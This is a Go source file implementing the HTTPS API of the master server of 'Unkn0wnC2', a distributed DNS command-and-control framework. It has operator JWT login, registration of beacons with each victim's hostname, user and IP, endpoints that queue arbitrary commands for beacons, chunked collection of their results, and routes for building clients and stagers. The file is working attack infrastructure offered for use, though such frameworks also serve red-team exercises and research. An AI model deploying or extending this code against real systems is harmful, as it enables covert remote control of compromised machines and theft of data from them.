// Package main implements the HTTPS API for the Unkn0wnC2 Master Server.
// This provides RESTful endpoints for operator management, DNS server coordination,
// and beacon/task orchestration across distributed DNS C2 servers.
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"github.com/gorilla/mux"
)

// APIServer wraps the HTTP server and provides API functionality
type APIServer struct {
	db        *MasterDatabase
	config    Config
	jwtSecret []byte
}

// NewAPIServer creates a new API server instance
func NewAPIServer(db *MasterDatabase, config Config) *APIServer {
	return &APIServer{
		db:        db,
		config:    config,
		jwtSecret: []byte(config.JWTSecret),
	}
}

// Claims represents JWT token claims
type Claims struct {
	OperatorID string `json:"operator_id"`
	Username   string `json:"username"`
	Role       string `json:"role"`
	jwt.RegisteredClaims
}

// Response structures

type ErrorResponse struct {
	Error   string `json:"error"`
	Message string `json:"message,omitempty"`
}

type SuccessResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Token     string    `json:"token"`
	ExpiresAt time.Time `json:"expires_at"`
	Operator  struct {
		ID       string `json:"id"`
		Username string `json:"username"`
		Role     string `json:"role"`
	} `json:"operator"`
}

type DNSServerCheckinRequest struct {
	DNSServerID string                 `json:"dns_server_id"`
	APIKey      string                 `json:"api_key"`
	Status      string                 `json:"status"`
	Stats       map[string]interface{} `json:"stats"`
}

type BeaconReportRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	Beacon      struct {
		ID        string    `json:"id"`
		Hostname  string    `json:"hostname"`
		Username  string    `json:"username"`
		OS        string    `json:"os"`
		Arch      string    `json:"arch"`
		IPAddress string    `json:"ip_address"`
		FirstSeen time.Time `json:"first_seen"`
		LastSeen  time.Time `json:"last_seen"`
	} `json:"beacon"`
}

type TaskCreateRequest struct {
	BeaconID string `json:"beacon_id"`
	Command  string `json:"command"`
}

type ResultSubmitRequest struct {
	DNSServerID string `json:"dns_server_id"`
	APIKey      string `json:"api_key"`
	TaskID      string `json:"task_id"`
	BeaconID    string `json:"beacon_id"`
	ChunkIndex  int    `json:"chunk_index"`
	TotalChunks int    `json:"total_chunks"`
	Data        string `json:"data"`
}

type TaskProgressRequest struct {
	DNSServerID    string `json:"dns_server_id"`
	APIKey         string `json:"api_key"`
	TaskID         string `json:"task_id"`
	BeaconID       string `json:"beacon_id"`
	ReceivedChunks int    `json:"received_chunks"`
	TotalChunks    int    `json:"total_chunks"`
	Status         string `json:"status"` // "receiving", "assembling", "complete"
}

// Middleware

// loggingMiddleware logs all API requests
func (api *APIServer) loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()

		// Call the next handler
		next.ServeHTTP(w, r)

		// Log request
		if api.config.Debug {
			fmt.Printf("[API] %s %s - %s - %v\n",
				r.Method,
				r.RequestURI,
				r.RemoteAddr,
				time.Since(start))
		}
	})
}

// authMiddleware validates JWT tokens for operator endpoints
func (api *APIServer) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Extract token from Authorization header
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			api.sendError(w, http.StatusUnauthorized, "missing authorization header")
			return
		}

		// Check for Bearer token
		parts := strings.Split(authHeader, " ")
		if len(parts) != 2 || parts[0] != "Bearer" {
			api.sendError(w, http.StatusUnauthorized, "invalid authorization format")
			return
		}

		tokenString := parts[1]

		// Parse and validate token
		claims := &Claims{}
		token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
			// Validate signing method
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
			}
			return api.jwtSecret, nil
		})

		if err != nil || !token.Valid {
			api.sendError(w, http.StatusUnauthorized, "invalid token")
			return
		}

		// Add claims to request context for handlers to use
		r = r.WithContext(r.Context())
		r.Header.Set("X-Operator-ID", claims.OperatorID)
		r.Header.Set("X-Operator-Username", claims.Username)
		r.Header.Set("X-Operator-Role", claims.Role)

		next.ServeHTTP(w, r)
	})
}

// dnsServerAuthMiddleware validates DNS server API keys
func (api *APIServer) dnsServerAuthMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Extract DNS server ID and API key from request
		var dnsServerID, apiKey string

		// Try to get from JSON body (read and restore)
		if r.Method == http.MethodPost || r.Method == http.MethodPut {
			// Read the body
			bodyBytes, err := io.ReadAll(r.Body)
			if err != nil {
				api.sendError(w, http.StatusBadRequest, "failed to read request body")
				return
			}
			r.Body.Close()

			// Parse to get auth info
			var authData struct {
				DNSServerID string `json:"dns_server_id"`
				APIKey      string `json:"api_key"`
			}
			if err := json.Unmarshal(bodyBytes, &authData); err != nil {
				api.sendError(w, http.StatusBadRequest, "invalid request body")
				return
			}

			dnsServerID = authData.DNSServerID
			apiKey = authData.APIKey

			// Restore the body for the handler to read
			r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
		} else {
			// Try query parameters for GET requests
			dnsServerID = r.URL.Query().Get("dns_server_id")
			apiKey = r.URL.Query().Get("api_key")
		}

		if dnsServerID == "" || apiKey == "" {
			api.sendError(w, http.StatusUnauthorized, "missing dns_server_id or api_key")
			return
		}

		// Verify API key
		valid, err := api.db.VerifyDNSServerAPIKey(dnsServerID, apiKey)
		if err != nil {
			api.sendError(w, http.StatusInternalServerError, "authentication error")
			return
		}

		if !valid {
			api.sendError(w, http.StatusUnauthorized, "invalid credentials")
			return
		}

		// Store DNS server ID in header for handler
		r.Header.Set("X-DNS-Server-ID", dnsServerID)

		next.ServeHTTP(w, r)
	})
}

// Helper methods

func (api *APIServer) sendError(w http.ResponseWriter, status int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(ErrorResponse{
		Error:   http.StatusText(status),
		Message: message,
	})
}

func (api *APIServer) sendSuccess(w http.ResponseWriter, message string, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(SuccessResponse{
		Success: true,
		Message: message,
		Data:    data,
	})
}

func (api *APIServer) sendJSON(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(data)
}

// Authentication Endpoints

// handleLogin authenticates an operator and returns a JWT token
func (api *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Verify credentials
	operatorID, role, err := api.db.VerifyOperatorCredentials(req.Username, req.Password)
	if err != nil {
		api.sendError(w, http.StatusUnauthorized, "invalid credentials")

		// Log failed login attempt
		api.db.LogAuditEvent("", "login_failed", "operator", req.Username,
			fmt.Sprintf("Failed login attempt for username: %s", req.Username),
			r.RemoteAddr)
		return
	}

	// Generate JWT token
	expiresAt := time.Now().Add(time.Duration(api.config.SessionTimeout) * time.Minute)
	claims := &Claims{
		OperatorID: operatorID,
		Username:   req.Username,
		Role:       role,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(expiresAt),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
			Issuer:    "unkn0wnc2-master",
		},
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, err := token.SignedString(api.jwtSecret)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to generate token")
		return
	}

	// Log successful login
	api.db.LogAuditEvent(operatorID, "login_success", "operator", operatorID,
		fmt.Sprintf("Successful login for %s", req.Username), r.RemoteAddr)

	// Return token
	response := LoginResponse{
		Token:     tokenString,
		ExpiresAt: expiresAt,
	}
	response.Operator.ID = operatorID
	response.Operator.Username = req.Username
	response.Operator.Role = role

	api.sendJSON(w, response)
}

// handleLogout invalidates the operator's session
func (api *APIServer) handleLogout(w http.ResponseWriter, r *http.Request) {
	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")

	// Log logout
	api.db.LogAuditEvent(operatorID, "logout", "operator", operatorID,
		fmt.Sprintf("Logout for %s", username), r.RemoteAddr)

	api.sendSuccess(w, "logged out successfully", nil)
}

// DNS Server Management Endpoints

// handleListDNSServers returns all registered DNS servers
func (api *APIServer) handleListDNSServers(w http.ResponseWriter, r *http.Request) {
	servers, err := api.db.GetDNSServers()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
		return
	}

	api.sendJSON(w, map[string]interface{}{
		"servers": servers,
	})
}

// handleDNSServerCheckin processes check-in from a DNS server
func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Request) {
	var req DNSServerCheckinRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Update check-in time and detect if this is first checkin
	isFirstCheckin, err := api.db.UpdateDNSServerCheckin(dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update check-in")
		return
	}

	// If this is the first checkin, broadcast domain list to all beacons
	if isFirstCheckin {
		go func() {
			// Get all enabled DNS domains
			domains, err := api.db.GetEnabledDNSDomains()
			if err != nil {
				if api.config.Debug {
					fmt.Printf("[Master] Failed to get DNS domains: %v\n", err)
				}
				return
			}

			// Create broadcast task with domain list as JSON
			domainsJSON, _ := json.Marshal(domains)
			command := fmt.Sprintf("update_domains:%s", string(domainsJSON))

			err = api.db.CreateBroadcastTask(command, "system")
			if err != nil {
				if api.config.Debug {
					fmt.Printf("[Master] Failed to create broadcast task: %v\n", err)
				}
				return
			}

			if api.config.Debug {
				fmt.Printf("[Master] 🔄 Broadcasting domain update to all beacons (new server: %s)\n", dnsServerID)
				fmt.Printf("[Master] Updated domains: %v\n", domains)
			}
		}()
	}

	api.sendSuccess(w, "check-in recorded", map[string]interface{}{
		"dns_server_id":    dnsServerID,
		"timestamp":        time.Now(),
		"is_first_checkin": isFirstCheckin,
	})
}

// Beacon Management Endpoints

// handleBeaconReport processes a beacon report from a DNS server
func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request) {
	var req BeaconReportRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Failed to decode beacon report: %v\n", err)
		}
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	if api.config.Debug {
		fmt.Printf("[API] 📡 Beacon report received: %s from DNS server %s\n", req.Beacon.ID, dnsServerID)
		fmt.Printf("[API]    Hostname: %s, User: %s, OS: %s, IP: %s\n",
			req.Beacon.Hostname, req.Beacon.Username, req.Beacon.OS, req.Beacon.IPAddress)
		fmt.Printf("[API]    FirstSeen: %v, LastSeen: %v\n", req.Beacon.FirstSeen, req.Beacon.LastSeen)
	}

	// Store beacon in master database (upsert for updates)
	err := api.db.UpsertBeacon(
		req.Beacon.ID,
		req.Beacon.Hostname,
		req.Beacon.Username,
		req.Beacon.OS,
		req.Beacon.Arch,
		req.Beacon.IPAddress,
		dnsServerID,
		req.Beacon.FirstSeen,
		req.Beacon.LastSeen,
	)

	if err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Error storing beacon: %v\n", err)
		}
		api.sendError(w, http.StatusInternalServerError, "failed to register beacon")
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] ✅ Beacon %s stored successfully from DNS server %s\n",
			req.Beacon.ID, dnsServerID)
	}

	api.sendSuccess(w, "beacon registered", map[string]interface{}{
		"beacon_id":     req.Beacon.ID,
		"dns_server_id": dnsServerID,
	})
}

// handleListBeacons returns all beacons across all DNS servers
func (api *APIServer) handleListBeacons(w http.ResponseWriter, r *http.Request) {
	// Get all active beacons (active within last 30 minutes)
	beacons, err := api.db.GetActiveBeacons(30)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
		return
	}

	api.sendJSON(w, map[string]interface{}{
		"beacons": beacons,
	})
}

// handleGetBeacon returns details for a specific beacon
func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	beaconID := vars["id"]

	if api.config.Debug {
		fmt.Printf("[API] Beacon details requested: %s\n", beaconID)
	}

	beacon, err := api.db.GetBeacon(beaconID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
		return
	}

	if beacon == nil {
		api.sendError(w, http.StatusNotFound, "beacon not found")
		return
	}

	api.sendJSON(w, beacon)
}

// Task Management Endpoints

// handleCreateTask creates a new task for a beacon
func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	var req TaskCreateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	operatorID := r.Header.Get("X-Operator-ID")
	username := r.Header.Get("X-Operator-Username")

	// Create task in database
	taskID, err := api.db.CreateTask(req.BeaconID, req.Command, operatorID)
	if err != nil {
		if api.config.Debug {
			fmt.Printf("[API] ❌ Failed to create task: %v\n", err)
		}
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create task: %v", err))
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] ✅ Task %s created by %s: '%s' for beacon %s\n",
			taskID, username, req.Command, req.BeaconID)
	}

	// Log task creation
	api.db.LogAuditEvent(operatorID, "task_create", "task", taskID,
		fmt.Sprintf("Created task for beacon %s: %s", req.BeaconID, req.Command), r.RemoteAddr)

	api.sendSuccess(w, "task created", map[string]interface{}{
		"task_id":   taskID,
		"beacon_id": req.BeaconID,
		"command":   req.Command,
		"status":    "pending",
	})
}

// handleListTasks returns all tasks
func (api *APIServer) handleListTasks(w http.ResponseWriter, r *http.Request) {
	// Get optional limit parameter
	limitStr := r.URL.Query().Get("limit")
	limit := 100 // default
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}

	tasks, err := api.db.GetAllTasks(limit)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
		return
	}

	api.sendJSON(w, map[string]interface{}{
		"tasks": tasks,
	})
}

// handleGetTask returns details for a specific task
func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	task, err := api.db.GetTaskWithResult(taskID)
	if err != nil {
		if err.Error() == "task not found" {
			api.sendError(w, http.StatusNotFound, "task not found")
		} else {
			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task["status"])
	}

	api.sendJSON(w, task)
}

// handleGetTaskResult returns the result for a specific task
func (api *APIServer) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	// Get the complete result
	resultData, isComplete, err := api.db.GetTaskResult(taskID)

	if err != nil {
		if err.Error() == "no result found" {
			api.sendError(w, http.StatusNotFound, "result not found")
		} else {
			api.sendError(w, http.StatusInternalServerError, "failed to retrieve result")
		}
		return
	}

	if !isComplete {
		// Partial result - return progress
		received, total, _ := api.db.GetTaskResultProgress(taskID)
		api.sendJSON(w, map[string]interface{}{
			"task_id":      taskID,
			"is_complete":  false,
			"progress":     fmt.Sprintf("%d/%d chunks", received, total),
			"received":     received,
			"total_chunks": total,
		})
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Task result retrieved: %s (%d bytes)\n", taskID, len(resultData))
	}

	// Complete result
	api.sendJSON(w, map[string]interface{}{
		"task_id":     taskID,
		"is_complete": true,
		"result":      resultData,
		"size":        len(resultData),
	})
}

// handleGetTasksForDNSServer returns pending tasks for a specific DNS server
func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	tasks, err := api.db.GetTasksForDNSServer(dnsServerID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
		return
	}

	// Mark tasks as 'sent' to prevent duplicate polling
	if len(tasks) > 0 {
		taskIDs := make([]string, len(tasks))
		for i, task := range tasks {
			taskIDs[i] = task["id"].(string)
		}

		if err := api.db.MarkTasksSent(taskIDs); err != nil && api.config.Debug {
			fmt.Printf("[API] Warning: Failed to mark tasks as sent: %v\n", err)
		}
	}

	if api.config.Debug && len(tasks) > 0 {
		fmt.Printf("[API] Returning %d task(s) to DNS server %s\n", len(tasks), dnsServerID)
	}

	// Return tasks array directly (not wrapped in object)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(tasks)
}

// handleGetBeaconsForDNSServer returns all active beacons (for cross-server awareness)
// This allows DNS servers to know about beacons registered on other servers
func (api *APIServer) handleGetBeaconsForDNSServer(w http.ResponseWriter, r *http.Request) {
	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Get all active beacons from master (active = seen in last 10 minutes)
	beacons, err := api.db.GetActiveBeacons(10)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Beacon list requested by DNS server %s: %d active beacons\n",
			dnsServerID, len(beacons))
	}

	api.sendJSON(w, beacons)
}

// handleSubmitResult processes a task result from a DNS server
// Handles both single-chunk and multi-chunk results from distributed DNS servers
func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request) {
	var req ResultSubmitRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Store the result chunk in master database
	err := api.db.SaveResultChunk(
		req.TaskID,
		req.BeaconID,
		dnsServerID,
		req.ChunkIndex,
		req.TotalChunks,
		req.Data,
	)

	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to store result chunk")
		if api.config.Debug {
			fmt.Printf("[API] Error storing result chunk: %v\n", err)
		}
		return
	}

	if api.config.Debug {
		if req.TotalChunks == 1 {
			fmt.Printf("[API] Complete result from DNS server %s: Task %s (%d bytes)\n",
				dnsServerID, req.TaskID, len(req.Data))
		} else {
			// Check progress for multi-chunk results
			received, total, _ := api.db.GetTaskResultProgress(req.TaskID)
			fmt.Printf("[API] Result chunk from DNS server %s: Task %s, chunk %d/%d (progress: %d/%d)\n",
				dnsServerID, req.TaskID, req.ChunkIndex, req.TotalChunks, received, total)
		}
	}

	api.sendSuccess(w, "result recorded", map[string]interface{}{
		"task_id":      req.TaskID,
		"chunk_index":  req.ChunkIndex,
		"total_chunks": req.TotalChunks,
	})
}

// handleSubmitProgress processes task progress updates from DNS servers
func (api *APIServer) handleSubmitProgress(w http.ResponseWriter, r *http.Request) {
	var req TaskProgressRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")

	// Update task progress in database
	err := api.db.UpdateTaskProgress(
		req.TaskID,
		req.BeaconID,
		dnsServerID,
		req.ReceivedChunks,
		req.TotalChunks,
		req.Status,
	)

	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to update progress")
		if api.config.Debug {
			fmt.Printf("[API] Error updating progress: %v\n", err)
		}
		return
	}

	if api.config.Debug {
		fmt.Printf("[API] Progress update from %s: Task %s - %d/%d chunks (%s)\n",
			dnsServerID, req.TaskID, req.ReceivedChunks, req.TotalChunks, req.Status)
	}

	api.sendSuccess(w, "progress updated", nil)
}

// handleGetTaskProgress returns progress information for a specific task
func (api *APIServer) handleGetTaskProgress(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	taskID := vars["id"]

	// Use the results-based progress calculation for accurate operator view
	progress, err := api.db.GetTaskProgressFromResults(taskID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve progress")
		return
	}

	api.sendJSON(w, progress)
}

// handleStats returns master server statistics
func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
	stats, err := api.db.GetDatabaseStats()
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to retrieve stats")
		return
	}

	api.sendJSON(w, stats)
}

// SetupRoutes configures all API routes
func (api *APIServer) SetupRoutes(router *mux.Router) {
	// Web UI endpoints (serve HTML)
	router.HandleFunc("/", api.handleRoot).Methods("GET")
	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")

	// Serve static files (CSS, JS, images)
	router.PathPrefix("/web/static/").Handler(
		http.StripPrefix("/web/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static")))),
	)

	// Public API endpoints (no auth required)
	router.HandleFunc("/api/auth/login", api.handleLogin).Methods("POST")

	// Operator endpoints (JWT auth required)
	operatorRouter := router.PathPrefix("/api").Subrouter()
	operatorRouter.Use(api.authMiddleware)

	operatorRouter.HandleFunc("/auth/logout", api.handleLogout).Methods("POST")
	operatorRouter.HandleFunc("/dns-servers", api.handleListDNSServers).Methods("GET")
	operatorRouter.HandleFunc("/beacons", api.handleListBeacons).Methods("GET")
	operatorRouter.HandleFunc("/beacons/{id}", api.handleGetBeacon).Methods("GET")
	operatorRouter.HandleFunc("/beacons/{id}/task", api.handleCreateTask).Methods("POST")
	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}", api.handleGetTask).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")

	// Builder endpoints
	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")

	// DNS server endpoints (API key auth required)
	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
	dnsRouter.Use(api.dnsServerAuthMiddleware)

	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")

	// Health check endpoint (no auth)
	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}).Methods("GET")
}

// Web UI Handlers

func (api *APIServer) handleRoot(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func (api *APIServer) handleLoginPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "login.html"))
}

func (api *APIServer) handleDashboardPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "dashboard.html"))
}

func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "beacon.html"))
}
